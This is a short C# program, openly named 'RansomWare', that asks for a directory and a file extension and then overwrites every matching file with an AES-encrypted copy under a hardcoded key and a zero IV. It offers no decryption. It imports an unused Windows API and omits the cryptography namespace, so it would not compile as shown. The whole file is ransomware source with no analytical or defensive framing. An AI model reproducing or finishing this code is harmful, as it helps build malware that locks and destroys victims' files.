using System;
using System.IO;
using System.Runtime.InteropServices;

class RansomWare
{
    [DllImport("kernel32.dll")]
    static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, uint dwMoveFileFlags);

    public static void Main()
 {
        Console.Write("Enter the directory path: ");
        string dir = Console.ReadLine();

        Console.Write("Enter the file extension (e.g., txt, doc): ");
        string ext = Console.ReadLine();

        // Scan for files with the specified extension
        foreach (string file in Directory.GetFiles(dir))
        {
            if (file.EndsWith(ext))
            {
                // Encrypt the file using AES
                byte[] bytes = File.ReadAllBytes(file);
                byte[] encryptedBytes = Encrypt(bytes, "mysecretpassword");

                // Save the encrypted file
                File.WriteAllBytes(file, encryptedBytes);

                Console.WriteLine("File " + file + " has been encrypted.");
            }
        }

        Console.Write("Press any key to exit...");
        Console.ReadKey();
    }

    public static byte[] Encrypt(byte[] bytes, string password)
 {
        using (Aes aes = Aes.Create())
        {
            aes.Key = System.Text.Encoding.UTF8.GetBytes(password);
            aes.IV = new byte[16];

            ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                {
                    cs.Write(bytes, 0, bytes.Length);
                }

                return ms.ToArray();
            }
        }
    }
}

